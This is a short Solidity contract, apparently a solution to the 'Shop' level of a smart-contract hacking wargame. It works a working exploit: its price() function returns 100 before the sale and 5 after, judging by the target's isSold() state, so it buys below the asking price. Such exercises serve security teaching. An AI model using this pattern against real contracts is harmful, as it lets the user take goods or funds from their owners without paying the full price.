pragma solidity ^0.6.0;

import "../21-shop/Shop.sol";

contract ShopAttack {
    function attack(Shop target) public {
        Shop(target).buy();
    }

    function price() external view returns (uint) {
        // When '_buyer.price.gas(3000)() >= price', isSold is false, so return 100
        // When 'price = _buyer.price.gas(3000)();', isSold is true, so return less than 100
        return Shop(msg.sender).isSold() ? 5 : 100;
    }
}
